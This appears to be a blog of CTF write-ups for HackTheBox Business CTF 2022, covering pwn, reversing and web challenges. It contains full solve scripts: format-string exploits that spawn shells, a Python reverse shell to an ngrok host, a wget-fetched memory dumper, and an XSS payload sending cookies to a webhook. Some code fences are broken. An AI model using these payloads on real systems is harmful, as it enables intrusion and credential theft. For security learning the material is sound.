## Introduction

Last weekend, I participated in [HackTheBox's Business CTF](https://www.hackthebox.com/events/htb-business-ctf-2022), which was really fun. I generally find the more hardcore CTFs are too menacing for general consumption (looking at you DEFCON, why so many reversing challenges), and HTB actually does a great job balancing the difficulty and fun of the challenges. In the spirit of being more consistent in my blogging and writing, I have decided to write some writeups for the challenges I worked on for this competition. This writeup is more verbose than your usual writeups in order to aid understanding, so be warned!

### \[Pwn\] Superfast (unsolved) - (18 Solves)

I usually don't touch pwn when playing with CTF.SG because that's not my forte (and there are tons of people better than me at this), but in the absence of any other pwners on team I did this CTF played with, I always love to take the opportunity to actually work on pwning. We are given a PHP plugin pwn as an *easy* challenge, which scared the living poop out of me whe I first saw it. Thankfully, the bug wasn't too difficult to spot.

{% highlight c %}
zend_string* decrypt(char* buf, size_t size, uint8_t key) {
    char buffer[64] = {0};
    // XXX - unsigned comparison --- waituck
    if (sizeof(buffer) - size > 0) {
        memcpy(buffer, buf, size);
    } else {
        return NULL;
    }
    for (int i = 0; i < sizeof(buffer) - 1; i++) {
        buffer[i] ^= key;
    }
    return zend_string_init(buffer, strlen(buffer), 0);
}
{% endhighlight %}

`sizeof(buffer)` is unsigned and `size` is of `size_t` which is also unsigned, so `sizeof(buffer) - size` is unsigned and will never be less than 0. This means we can specify a `size` greater than `sizeof(buffer)`, and the corresponding `memcpy` results in a **stack buffer overflow**! We can confirm this in IDA Freeware, which shows that the size check is indeed trivially bypassable.

![](/images/htbbusiness2022/superfast_ida.png)

The arguments are passed in the following PHP function defined:

```c
zend_function_entry logger_functions[] = {
    PHP_FE(log_cmd, arginfo_log_cmd)
    {NULL, NULL, NULL}
};

PHP_FUNCTION(log_cmd) {
    char* input;
    zend_string* res;
    size_t size;
    long key;
    if (zend_parse_parameters(ZEND_NUM_ARGS(), "sl", &input, &size, &key) == FAILURE) {
        RETURN_NULL();
    }
    res = decrypt(input, size, (uint8_t)key);
    ...
```

At first, I thought some sort of magic was needed to understand how `zend_parse_parameters` work to learn how it parsed parameters from `log_cmd`, thinking `log_cmd` was some kind of serialized object and `"sl"` being some rule to deserialize input by. A quick look at the PHP code calling this proved me wrong and it takes in parameters in the standard PHP way:

```php
<?php
if (isset($_SERVER['HTTP_CMD_KEY']) && isset($_GET['cmd'])) {
    $key = intval($_SERVER['HTTP_CMD_KEY']);
    if ($key <= 0 || $key > 255) {
        http_response_code(400);
    } else {
        log_cmd($_GET['cmd'], $key);
    }
} 
...
```

We write a quick PoC exploiting the buffer overflow which results in a crash in the PHP server.

```python
#!/usr/bin/env python3

from pwn import *
import requests

URL = "http://127.0.0.1:1337"
headers = {
    "CMD_KEY": b"1"
}
params = {
    "cmd": b"1" * 256
}

r = requests.get(URL, params=params, headers=headers)
print(r)
```

We can now look at the protections to see what sort of convuluted hoop we have to jump to get a shell.

```sh
$ checksec php_logger.so
[*] '/home/waituck/htb-business-2022/pwn_superfast/challenge/php_logger.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

No canary found, so we can straight up control the instruction pointer RIP. However, with PIE and NX enabled, this means we need to leak the addresses of where the module is stored if we want to be able to jump to a relative offset of the .text section of the module, since the module offsets would be different with each run. However, we don't have anything that we can print or output to, but another promising function is defined in `php_logger.so`:

```c
__attribute__((force_align_arg_pointer))
void print_message(char* p) {
    php_printf(p);
}
```

This is essentially a thin wrapper around `printf`, if we can somehow jump to that address, we might be able to use it to leak addresses! However, we typically need to know its actual address in memory to return to it, due to PIE. Thankfully, the stored RIP is actually quite close to `print_message` (in fact, it only differs in the least significant byte), and with a one byte overwrite of the stored RIP on the stack, we are able to get to invoke the `printf`, which actually acts on our buffer! We update our PoC to exploit this, as below:

```python
#!/usr/bin/env python3

from pwn import *
import requests

URL = "http://127.0.0.1:1337"
headers = {
    "CMD_KEY": b"1"
}
params = {
    "cmd": xor(b"0x%08x", b"\x01") +  b"\x01" * (146) + b"\xa9" * 1 
}

r = requests.get(URL, params=params, headers=headers)
print(r)
print(r.text) # gets format string output
```

The only problem was that returning to `print_message` and invoking the format string exploit causes the program to segfault and crash (and me to cry), meaning that whatever addresses we leak out of there wouldn't be useful in the next run of the program since they would be different. This is where I got stuck, and I looked around for other modules and libraries loaded by PHP to see if I could jump to them (the answer is no, all of them were PIE). The solution I suspected was to somehow fix up the things that broke the execution using the same format string vulnerability, but did not get the time to deep dive into how that was possible since we had other challenges to work on.

It was only after the competition that I found out that a good portion of the solves cheesed the challenge by loading the flag directly, as such (they had to guess though, because the Docker file didn't actually work or put the flag file into the container):

```sh
‚ùØ curl 'http://206.189.124.56:31713/flag.txt'
HTB{rophp1ng_4r0und_th3_st4ck!}
```

### \[Pwn\] Payback - (34 Solves)

After that unfortunate encounter with Superfast (and burning a ton of time for not solving it), I turned to another pwn challenge which was thankfully easier. We are provided source code in `main.c` so we can skip the step of opening the binary up in IDA. I don't remember what the challenge binary does because the code was decently long, but this definitely stands out like a sore thumb:

```c
// i added a new feature i hope you like it
int delete_bot()
{
    unsigned int id;
    id = getId();
    if (botBuf[id].url != NULL)
    {
        char reasonbuf[MAX_REASON_SIZE];
        memset(reasonbuf, '\x00', MAX_REASON_SIZE);
        // gather statistics
        printf("\n[*] Enter the reason of deletion: ");
        read(STDIN_FILENO, &reasonbuf, MAX_REASON_SIZE - 1);
        free(botBuf[id].url);
        botBuf[id].url = NULL;
        puts("\n[+] Bot Deleted successfully! | Reason: ");
        // XXX - format string vulnerability --- waituck
        printf(reasonbuf);
        return 0;
    }
    puts("\n[!] Error: Unable to fetch the requested bot entry.\n");
}
```

`reasonbuf` is user controlled here and passed directly to `printf`, which is your classical **format string vulnerability** *(again..., this won't be the last time you hear format string in this article)*.

One of my teammates wrote a wrapper in the time I was attempting to solve Superfast, which employs the [FmtStr](https://docs.pwntools.com/en/stable/fmtstr.html) function in `pwntools` to find the offsets. I didn't know about this library, and this saved *a ton of time* working on this challenge, because I really hate exploiting format string bugs.

The general flow of exploiting a format string vulnerability is to overwrite an address that gives you code execution. Typical targets are the GOT table, but in this case since Full RelRO is enabled the GOT is protected, so we are left with function pointers like `__free_hook` or `__malloc_hook`. In this case, the `__free_hook` is a nice target since the allocated and user controlled `botBuf[id].url` is freed directly with no modifications or protections. Due to ASLR we have to leak the address of where libc is in memory, and leaking involves printing addresses on the stack until we find an address that looks like a libc address (and looking at the debugger to see what the offset is from the real libc base address). 

Once we have that, we make use of the given libc in the challenge to figure out the offsets to functions we might want to call (e.g. `system`) and function pointers we want to overwrite (e.g. `__free_hook`). Using `fmtstr_payload` from `pwntools` instantly gives you the payload needed to perform the necessary short writes with the format string vulnerability, so you don't actually have to re-read the [format string bible](https://cs155.stanford.edu/papers/formatstring-1.2.pdf) to figure out how to do format string again. The final solve script looks like this:

```python
#!/usr/bin/python3
from pwn import *
exe = ELF("./payback")
libc = ELF("./.glibc/libc.so.6")
context.binary = exe
# context.log_level = "debug"

gs = '''
continue
'''

if args['REMOTE']:
    io = remote('206.189.25.173', 30362)
elif args.GDB:
    io = gdb.debug('./payback', gs)
else:
    io = process('./payback')

def fmt_str(payload):
    io.sendline(b'1')
    io.sendline(b'http://urlplaceholder.com/')
    io.sendline(b'1337')
    io.sendline(b'3')
    io.sendline(b'0')
    io.sendafter(b'[*] Enter the reason of deletion: ', payload)
    io.sendline()
    io.recvuntil("Reason: \n")
    result = io.recvline()
    return result

def main():
    data = fmt_str("0x%08lx 0x%08lx").decode('utf-8').strip().split()[0]
    libc_base = int(data, 16) - 0x1ed723
    libc.address = libc_base
    info(f"libc base: {libc_base:02x}")
    info(f"free_hook: {libc.sym.__free_hook:02x}")
    info(f"system addr: {libc.sym.system:02x}")
    
    # write system to free_hook
    payload = fmtstr_payload(8, {libc.sym.__free_hook: libc.sym.system}, write_size='byte')
    fmt_str(payload)

    # pwn
    io.sendline(b'1')
    io.sendline(b'/bin/sh')
    io.sendline(b'1337')
    io.sendline(b'3')
    io.sendline(b'0')
    io.sendline(b'I WANT SHELL')
    io.interactive()
    
if __name__ == '__main__':
    main()
```

Which gives us shell and the flag :)

### \[Pwn\] Insider - (21 Solves)

This challenge is a really really long binary which implements a full FTP server. There's quite a fair bit of reversing to go about (which I shall not get into here), but the general flow is to open it in IDA and rename and mark interesting functions.

The first part is to access the FTP server, which requires both the username and password via the USER and PASS command. The binary hardcodes the username and password in a simple `strcmp`, and this can be gleaned from the decompilation. 

```c
_BOOL8 __fastcall sub_2A22(const char *a1)
{
  return strcmp(a1, ";)") == 0;
}
```

With the username and password, we can move on to other interesting functions in the FTP server. Two interesting functions can be noted. First, `case 16` has a `sprintf`, which might overflow if your current working directory is long enough and the buffer `s` is not big enough:

```c
case 16:
    if ( v131 >= 0 )
    {
        getcwd(buf, 0x1000uLL);
        sprintf(s, "ls -l %s", buf);
        v122 = popen(s, "r");
        sub_2449(v122);
        sub_2379("%d Transfer completed \r\n", 226LL, v27, v28, v29, v30);
        pclose(v122);
        v131 = -1;
    }
    if ( v132 >= 0 )
        v132 = -1;
    break;
```

This seems like a pretty convoluted buffer overflow and I didn't seem likely to be the exploit path, so I moved on to other interesting functions. As a side note, the `popen` is also a valid target for command injection [since it passes it to the shell](https://man7.org/linux/man-pages/man3/popen.3.html#:~:text=This%20command%20is%20passed%20to%0A%20%20%20%20%20%20%20/bin/sh%20using%20the%20%2Dc%20flag%3B%20interpretation%2C%20if%20any%2C%20is%20performed%0A%20%20%20%20%20%20%20by%20the%20shell.) and can be exploited by overwriting v131 and creating a directory with a semi-colon. Credits to [this writeup](https://fascinating-confusion.io/posts/2022/07/htb-business-ctf-22-insider-writeup/) for this knowledge! 

Next, case 29 does some really janky stuff with the buffer it gives to `printf`, which raises serious alarm bells.

```c
case 29:
    memset(buf_1, 0, 0x44CuLL);
    *(_DWORD *)buf_1 = ' d%';
    memcpy(&buf_1[3], byte_6220, input);
    memcpy(&buf_1[input + 2], " \r\n", 3uLL);
    printf(buf_1, 431136LL, v41, v42, v43, v44);
    break;
```

`input` is the user controlled buffer after the command, and it is `memcpy`'d into `buf_1` and passed directly into `printf`. ***Again***, we have our **format string vulnerability**.  `case 29` corresponds to the `BKDR` command, so we quickly test this in our local environment to confirm the vulnerability.

```sh
waituck@ubuntu:~/htb-business-2022/pwn_insider/challenge$ ./chall
220 Blablah FTP 
USER ;)
331 User name okay need password 
PASS ;)
230 User logged in proceed 
BKDR %lx %lx
431136 BKDR 3 a0d 
BKDR %lx %lx %lx %lx
431136 BKDR 3 a0d 0 7ffed89590c0 
```

Looking at the protections, it is similar to that of Payback, so our solve path hopefully isn't too different here.

```sh
waituck@ubuntu:~/htb-business-2022/pwn_insider/challenge$ checksec chall
[*] '/home/waituck/htb-business-2022/pwn_insider/challenge/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./'
```

We won't be making use of the lack of stack canaries and will be ignoring that completely. It might have been needed for some other vulnerability in the library, but I am quite stubborn when I see a format string. When you start leaking via the format string vulnerability and in trying to find where our string is on the stack, it's really really far away. So far away that `FmtStr` in `pwntools` doesn't actually find the correct offset for you [(it stops at offset 1000)](https://github.com/Gallopsled/pwntools/blob/493a3e3d92/pwnlib/fmtstr.py#L860-L871). Thus begins some manual effort in `gdb` in digging out interesting addresses on the stack, and finding out which offset our string is stored on the stack. With some pain, we can replicate the exploitation steps in Payback, however, we don't get a very nice `free` (free is called immediately after `printf` and our buffer doesn't actually `/bin/sh`, so we can't overwrite it with `system` or it crashes). Here, we make use of the famous [`one_gadget`](https://github.com/david942j/one_gadget), which are gadgets in libc which execute `/bin/sh` (essentially the same thing as `system`). With that, we construct our solve script and get the flag!

```python
#!/usr/bin/env python3

from pwn import *
exe = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = exe
#context.log_level = "debug"

gs = '''
continue
'''

if args.REMOTE:
    io = remote('134.209.183.143', 30810)
elif args.GDB:
    io = gdb.debug('./chall', gs)
else:
    io = process('./chall')

io.recvline()
io.sendline(b'USER ;)')
io.recvline()
io.sendline(b'PASS ;)')
io.recvline()


def fmt_str(payload):
    io.sendline(b'BKDR ' + payload)
    io.recvuntil(b'BKDR ')
    result = io.recvline()
    return result


def main():
    addr_leak = fmt_str(b"0x%2739$lx")
    libc_base = int(addr_leak, 16) - 0x28565
    libc.address = libc_base
    info(f"libc base: {libc_base:02x}")
    info(f"free_hook: {libc.sym.__free_hook:02x}")
    info(f"system addr: {libc.sym.system:02x}")
    onegadget = libc.address + 0xde78c

    # write system to free_hook
    payload = fmtstr_payload(1031, {libc.sym.__free_hook: onegadget}, write_size='byte', numbwritten=12)
    io.sendline(b'BKDR ' + payload)

    io.interactive()
    
if __name__ == '__main__':
    main()
```

More writeups are due, the below isn't complete and are just solve script/brain dumps, stay tuned for the full writeup!

### \[Reversing\] Mr. Abilgate - (27 Solves)

A teammate of mine identified it was UPX packed, so I continued from there. If you tried unpacking it, the binary becomes broken (you can run it in a debugger and you would realize some addresses are not translated properly and results in a `EXCEPTION_ACCESS_VIOLATION` in some address starting at `0x14...`). Here's an example of an error you might face in the unpacked binary.

![](/images/htbbusiness2022/abilgate_debugger.png)

However, if you decompile the binary with [IDA Freeware](https://hex-rays.com/ida-free/), the code is roughly there with the exception of some indirection in library calls. Here's an example of a function that makes a ton of indirect library calls:

![](/images/htbbusiness2022/abilgate_function_example.png)

You can see that the "encodedFunctions" have been decoded. How, you might ask? What I did was to transcibe the calls in the decompiled unpacked binary as the source of truth during the reversing, and rely on running the original packed binary to analyse what actual functions were called!

The first hoop we have to jump over is a crash that occurs even in the original binary. We see the crash below:

![](/images/htbbusiness2022/initial_crash.png)

The crash is caused by passing an invalid handle of `0xDEADBEEF` to `CloseHandle`, as shown below:

![](/images/htbbusiness2022/closehandle.png)

We know it is `CloseHandle` because the function address is returned in RAX and IDA resolves it for us, so we can note this down in the unpacked binary. To counteract this, we need to put a breakpoint before `CloseHandle` is called, but since this is a UPX packed binary, the unpacked segments are dynamically generated, so with some trial and error I realized that by putting a **hardware, module relative, execute breakpoint** in IDA we can trigger the breakpoint, observe what is in RAX returned by the indirect function calls, and in this case, **modify RIP** to go over the `call rax` instruction so we won't execute it!

It's a bit painful to reverse because the unpacked binary you are working with is broken and I couldn't be bothered to fix what was broken in the unpacking (I didn't know what it was), so putting module relative offset hardware breakpoints in places I didn't understand in the original binary (so as to trigger the breakpoint when it unpacks), figuring out what it's doing dynamically, and then updating the decompilation in the broken unpacked binary until I can make sense of the code was what I did.

Now, if you reverse the encryption function and reproduce the key, we can simply reimplement the decryption to get the flag!

The solve script is below, which just implements the decryption for the encryption routine in the binary:

```cpp
#include <windows.h>
#include <wincrypt.h>
#include <fileapi.h>
#include <iostream>

const char* encFilePath = "C:\\Users\\IEUser\\Desktop\\ImportantAssets.xls.bhtbr";
const char* decFilePath = "C:\\Users\\IEUser\\Desktop\\ImportantAssets.xls";

int main()
{
    BYTE impt_hash[16] = {
        0xF9, 0x97, 0xB6, 0x47, 0x60, 0x08, 0xA7,  0xEA,  0xFB, 0x2D, 0xBE, 0x50, 0xE9, 0x96, 0x94, 0xF6
    };
    HCRYPTPROV hCryptProv = NULL;        // handle for a cryptographic
                                        // provider context
    HCRYPTHASH hCryptHash = NULL;
    HCRYPTKEY hCryptKey = NULL;

    CryptAcquireContextA(

        NULL,                  // container name 
        "Microsoft Enhanced RSA and AES Cryptographic Provider",                      // use the default provider
        24,             // provider type
        0xF0000000                    // flag values);
    );                       

    CryptCreateHash(
        hCryptProv,
        0x800C,
        NULL,
        NULL,
        &hCryptHash
    );

    printf("");

    CryptHashData(
        hCryptHash,
        impt_hash,
        sizeof(impt_hash),
        NULL
    );

    CryptDeriveKey(
        hCryptProv,
        0x6610,
        hCryptHash,
        0,
        &hCryptKey
    );
    HANDLE hEncFile = CreateFileA(
        encFilePath,
        0x80000000,
        0,
        0, 
        3,
        0x8000000,
        0
    );
    HANDLE hDecFile = CreateFileA(
        decFilePath,
        0x40000000,
        0,
        0,
        2,
        128,
        0
    );

    size_t fileSz = GetFileSize(hEncFile, NULL);
    DWORD totalNumBytesRead = 0;
    DWORD currNumBytesRead = 0;
    LPVOID pbBuf = calloc(1, 160);

    ReadFile(hEncFile, pbBuf, 160, &currNumBytesRead, NULL);

    while (currNumBytesRead) {
        totalNumBytesRead += currNumBytesRead;
        if (totalNumBytesRead >= fileSz) {
            CryptDecrypt(hCryptKey, 0, TRUE, 0, (BYTE*)pbBuf, &currNumBytesRead);
            WriteFile(hDecFile, pbBuf, 160, NULL, 0);
            break;
        }
        else {
            CryptDecrypt(hCryptKey, 0, FALSE, 0, (BYTE*)pbBuf, &currNumBytesRead);
            WriteFile(hDecFile, pbBuf, 160, NULL, 0);
            ReadFile(hEncFile, pbBuf, 160, &currNumBytesRead, NULL);
        }
    }
}
```

Compiling and running this in Visual Studio, we can get the decrypted resultant file. The resultant file isn't a proper `xls` file (at least, Excel on Mac was complaining). We observe that the file has a PK header like zip files, so we can simply unzip the resulting file and search for the flag with grep:

```sh

### \[Reversing\] Breakin (unsolved) - (20 Solves)

This was a C++ reversing challenge which is a bit intimidating but the actual non-library code was pretty tiny and had debug symbols could be quickly reversed. Once you reverse `getSecret`, you find the secret admin page and the password query needed (Breakin's flag) to get to the secret admin page, where you can upload marshaled Python objects that would execute on the server (gleaned from `getExec`). Figuring out how the marshaled object should look like was a pain and it kept crashing and returning `<NULL>`. The first step is to pull all the libraries to run it locally to iterate faster, because one invalid input crashes the container **forever**. It was until I found [this article](https://awasu.com/weblog/embedding-python/calling-python-code-from-your-program/) detailing the steps to constructing it before I could construct a valid marshaled object for the service's consumption.

I managed to get as far as the reverse shell before the competition ended, but unfortunately the reverse shell kept dying (likely due to a timeout). I reproduce the script I have so far. *Edit: it was not because of a timeout, the container just kept randomly dying without any warning.*

```python
code = b'''
def main():
    import os
    os.system("python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"0.tcp.ap.ngrok.io\\",17610));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\"/bin/sh\\")'")
    return "asd"
'''

import marshal
f = open("payload.pyc", "wb")
data = compile(code, 'payload.py', 'exec')
marshal.dump(data, f)
f.close()
```

I will be updating this with the proper solve script since I was rather close (I just needed to dump out the memory after getting shell).

**Update:** With the reverse shell, we simply have to dump the memory and analyze it to parse out the regions which are close to the python marshaled `key` object. We can do so with the following lines of shell

```sh
cd /tmp
wget https://gist.githubusercontent.com/Dbof/b9244cfc607cf2d33438826bee6f5056/raw/aa4b75ddb55a58e2007bf12e17daadb0ebebecba/memdump.py
python3 memdump.py 8
strings *
```

The container was **really** unstable though, for whatever reason this occurred closer to the end of the competition, and in the after party. Though I knew what to do, the container kept randomly crashing and sometimes refused to start. In any case, we will find the following hex string in memory, which we can decode to get the flag.

```

### \[Web\] Felonious Forums - (35 Solves)

This challenge was quite a rollercoaster ride. You are given a source code to a forum where you can post threads and comments in Markdown. A report feature is provided to report a post to an administrator. The goal is to steal the administrator's cookie, as shown in the code from `bot.js` below:

```js
const visitPost = async (id) => {
    try {
        const browser = await puppeteer.launch(browser_options);
        let context = await browser.createIncognitoBrowserContext();
        let page = await context.newPage();

        let token = await JWTHelper.sign({ username: 'moderator', user_role: 'moderator', flag: flag });
        await page.setCookie({
            name: "session",
            'value': token,
            domain: "127.0.0.1:1337"
        });

        await page.goto(`http://127.0.0.1:1337/report/${id}`, {
            waitUntil: 'networkidle2',
            timeout: 5000
        });
        await page.waitForTimeout(2000);
        await browser.close();
    } catch(e) {
        console.log(e);
    }
};
```

This is a pretty standard setup for a client-side XSS challenge where we steal a cookie using an XSS payload. We first need to look for any plausible XSS vectors. Most of the dynamic areas are unfortunately escaped via `nunjucks` as per `index.js`:

```js
nunjucks.configure('views', {
    autoescape: true,
    express: app
});
```

However, `nunjucks` provides an option to omit escaping certain fields via passing it to a safe filter, as described in this [StackOverflow post](https://stackoverflow.com/questions/29866034/stop-nunjucks-from-escaping-html). We look for usage of the `safe` filters, and we find the following mentions of `safe`, which would be the target of our code review:

![](/images/htbbusiness2022/safe.png)

We first analyze to see how they are populated, in particular the `GET /report` endpoint since this is the one that is visited by the bot. It is rendered as follows:

```js
router.get('/report/:id', AuthMiddleware, async (req, res) => {
    if (req.user.user_role !== 'moderator') return res.redirect('/home');
    const { id } = req.params;

    threadPost = await db.getPostById(id);
    if (!threadPost) return res.redirect('/home');

    res.render('report.html', {threadPost});
});
```

It simply takes the post and renders on the page... This seems promising, but looking at the how the post is constructed, we hit our first roadblock:

```js
router.post('/threads/create', AuthMiddleware, async (req, res) => {
    const {title, content, cat_id} = req.body;

    ...
    category = await db.getCategoryById(parseInt(cat_id));
    ...
    createThread = await db.createThread(req.user.id, category.id, title);
    ...
    newThread = await db.getLastThreadId();
    html_content = makeHTML(content);

    return db.postThreadReply(req.user.id, newThread.id, filterInput(html_content))
        .then(() => {
            return res.redirect(`/threads/${newThread.id}`);
        })
        .catch((e) => {
            return res.redirect('/threads/new');
        });
    ...
});
```
The key areas of code is that it first does `makeHTML`, then `filterInput`, and stores that in the database. Looking at the function definitions in `MDHelper.js`:

```js
const filterInput = (userInput) => {
    window = new JSDOM('').window;
    DOMPurify = createDOMPurify(window);
    return DOMPurify.sanitize(userInput, {ALLOWED_TAGS: ['strong', 'em', 'img', 'a', 's', 'ul', 'ol', 'li']});
}

const makeHTML = (markdown) => {
    return conv.makeHtml(markdown);
}
```

The data is first converted from Markdown to HTML via `makeHTML`, and passed into `DOMPurify` before being stored in the database. The latest version of `DOMPurify` was also used with no known CVEs. I was beginning to suspect that finding a 0-day in `DOMPurify` is unlikely the goal of the challenge. Further, looking at [issues with XSS](https://github.com/showdownjs/showdown/wiki/Markdown's-XSS-Vulnerability-(and-how-to-mitigate-it)) for `showdown`, the library used for Markdown conversion, the corect things were being done --- filtering is done serverside, and XSS filtering is done after Markdown conversion.

Now we are kind of stuck becuase the only place where we think the XSS should be cannot possibly have an XSS (but if you do find one, please report it to Cure53). We are left with other places, but let's open our mind to see where this goes. If we look at the rendering of the previews, something sticks out like a sore thumb:

```js
router.post('/threads/preview', AuthMiddleware, routeCache.cacheSeconds(30, cacheKey), async (req, res) => {
    const {title, content, cat_id} = req.body;

    if (cat_id == 1) {
        if (req.user.user_role !== 'Administrator') {
            return res.status(403).send(response('Not Allowed!'));
        }
    }

    category = await db.getCategoryById(parseInt(cat_id));
    safeContent = makeHTML(filterInput(content));

    return res.render('preview-thread.html', {category, title, content:safeContent, user:req.user});
});
```

The content is first passed through the XSS sanitizer, **then** the Markdown conversion occurs! This is the reverse order that is recommended. Using the following PoC below [from this blog](https://medium.com/taptuit/exploiting-xss-via-markdown-72a61e774bf8), we get our first `alert` popup, signifying a successful XSS>:

```markdown
![Uh oh...](https://www.example.com/image.png"onerror="alert('XSS'))
```

Now the issue is that the admin can't really see the XSS for two reasons:
1. The rendering of the preview is a POST request and we don't have a way of forcing the administrator to make any arbitrary POST request
2. The admin will only visit `GET /report/:id`

One thing that stood out like a sore thumb was the `routeCache` at the endpoint, which was a really odd thing to implement in a CTF challenge (CTF challenge writers don't like to write extraneous functions because those things take time and might introduce additional bugs). My first thought was to maybe force the XSS to be somehow cached so the administrator could view it. If we recall, the administrator is redirected to `/home` if a fake `id` was non-existent post `id` was provided:

```js
outer.get('/report/:id', AuthMiddleware, async (req, res) => {
    if (req.user.user_role !== 'moderator') return res.redirect('/home');
    const { id } = req.params;

    threadPost = await db.getPostById(id);
    if (!threadPost) return res.redirect('/home');

    res.render('report.html', {threadPost});
});
```

And by some stroke of luck, the `GET /home` endpoint was also cached:

```js
router.get('/home', AuthMiddleware, routeCache.cacheSeconds(30, cacheKey), async (req, res) => {
    let threads = await db.getThreads();
    let categories = await db.getCategories();

    return res.render('home.html', {threads, categories, user:req.user});
});
```

But as we know, the `/home` rendering wasn't vulnerable to XSS (since it didn't have anywhere with the `safe` filter). I then looked into how the cache key was calculated, as defined in `routes/index.js`

```js
const cacheKey = (req, res) => {
    return `_${req.headers.host}_${req.url}_${(req.headers['x-forwarded-for'] || req.ip)}`;
}
```

Things are largely good for us because the `host` header is something that we can control when we make a request (via specifying the Host header, since we aren't restricted to a browser and can use any request sender), so we can send a `host` header with `127.0.0.1:1337` (you can confirm this by setting up locally and logging it in the `cacheKey` function). We can also forge the IP by providing an `x-forwarded-for` header to be `127.0.0.1`. The `url` however, is extremely worrying. A bit of digging shows that this is [implemented in node JS itself under the `http` module](https://nodejs.org/api/http.html#http_message_url), so it's not something we can forge. No matter how we request for the preview, the resource will always be `/threads/preview` but the resource requested by the administrator will be `/report/:id`. Effectively, we seem to be stuck...

After some head scratching and banging, and copious amounts of walking around the office I noticed something odd in how the bot was requesting the resource:

```js
await page.goto(`http://127.0.0.1:1337/report/${id}`, {
    waitUntil: 'networkidle2',
    timeout: 5000
});
```

Are you able to spot the issue? If you look closely, `${id}` is directly interpolated into the URL being requested. If there's no sanitization here, we can add `../../` and request **any** arbitrary endpoint! This means we simply have to cache poison the thread preview with our payload that exfiltrates the cookie, and simply direct the administrator to the thread preview endpoint where the cached XSS resides with an `id` like `../threads/preview`. The only issue is that the administrator is making a `GET` request here and not a `POST` request. We check the endpoint for `GET /threads/preview` and find the following:

```js
router.get('/threads/preview', AuthMiddleware, routeCache.cacheSeconds(30, cacheKey), async (req, res) => {
    return res.redirect('/threads/new');
});
```

The most important thing is that the response for the endpoint is cached, and with the cache key ignoring the HTTP method used, we can chain the vulnerabilities above (the XSS in the preview, caching the XSS, directing the administrator to the XSS with the directory traversal) and construct our payload as below and get the flag exfiltrated to our webhook endpoint!

```python
#!/usr/bin/env python3

import requests

URL = "http://138.68.150.148:31833/threads/preview"
URL2 = "http://138.68.150.148:31833/api/report"


trigger = {
    "post_id": "../threads/preview"
}

headers = {
    "Cookie": "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoid2FpdHVjayIsInJlcHV0YXRpb24iOjAsImNyZWRpdHMiOjEwMCwidXNlcl9yb2xlIjoiTmV3YmllIiwiYXZhdGFyIjoibmV3YmllLndlYnAiLCJqb2luZWQiOiIyMDIyLTA3LTE2IDA3OjExOjMzIiwiaWF0IjoxNjU3OTU1NDk5fQ.MRR-uEf71mD7RruLrdZ1ga5XAGbtEBCm_Li-wsirRwA",
    "X-Forwarded-For": "127.0.0.1",
    "Host": "127.0.0.1:1337"
}

body = {
    "title": "",
    "content": '''![Uh oh...](https://www.example.com/image.png"onerror="fetch('https://webhook.site/6f47c639-ce29-4635-bcc9-c33ebf316fba?'+document.cookie))'''
}

# cache poison with XSS
r = requests.post(URL, headers=headers, data=body)
print(r.text)

# trigger
r = requests.post(URL2, headers=headers, json=trigger)
print(r.text)
```

P.S. I honestly found the directory traversal to be quite contrived and wished it wasn't there and instead in its place a better cache key collision mechanism was thought of.

### \[Web\] PhishTale - (24 Solves)

My teammates worked on this one more than I did. This was a nice N-day exploitation challenge, chaining two n-days together for remote code execution. A phishing server stood behind a varnish server, and all calls to a specific endpoint to generate payloads were only accessible on localhost. Thankfully, with the [request smuggling vulnerability that was present in the installed version](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36740), my teammate produced a working payload for the request smuggling. For more information on this part, you can find [Detectify's blog here](https://labs.detectify.com/2021/08/26/how-to-set-up-docker-for-varnish-http-2-request-smuggling/).

I focused on finding the bug after the request smuggling. If we look at `TemplateGenerator.php`, we see that the parameters passed into the export is used to generate a rendered template using Twig for the index page, which is a prime target for **Server Side Template Injection (SSTI)** which would give us the right primitive to perform remote code execution.

{% raw %} 
```php
public function generateIndex()
{
    $phishPage = "<?php \n\n";
    $phishPage .= "\$slack_webhook = \"$this->slack\"; \n";
    $phishPage .= "\$redirect = \"$this->redirect\"; \n";
    $phishPage .= "\$campaign = \"$this->campaign\"; \n";
    $phishPage .= "\$title = \"$this->title\"; \n";
    $phishPage .= "{% include '@phish/slack.php.twig' %}\n";
    $phishPage .= "{% include '@phish/logger.php.twig' %}\n";
    $phishPage .= "?>\n\n";
    $phishPage .= "{% include '@phish/$this->template/template.php' %}\n";

    $this->indexPage = $this->twig->createTemplate($phishPage)->render();
}
```
{% endraw %} 

I then noticed the version of Twig used was a bit older (3.3.7) in the `composer.json`, which was vulnerable to the following [issue](https://www.cybersecurity-help.cz/vdb/SB2022032424). At first, I tried to reverse what the vulnerability was from the additional test code added, which gave a glimpse of what it looked like, but the maintainers were crafty enough to not add the actual payloads of what an exploit looked like in the repository. However, one should carefully read the exploit advisory, which I have reproduced below:

> When in a sandbox mode, the arrow parameter of the sort filter must be a closure to avoid attackers being able to run arbitrary PHP functions.

So one is able to provide "non-closures" previously in the `sort` filter. We first need to understand what a "closure" is in the `arrow` parameter, and we turn to the [official documentation](https://twig.symfony.com/doc/2.x/filters/sort.html) for some ideas.

{% raw %} 
```php
{% for fruit in fruits|sort((a, b) => a.quantity <=> b.quantity)|column('name') %}
    {{ fruit }}
{% endfor %}
```
{% endraw %} 

So a closure is essentially an anonymous function, which also checks out with the [PHP documentation](https://www.php.net/manual/en/class.closure.php), which states:

> The Closure class: Class used to represent anonymous functions. Anonymous functions yield objects of this type. 

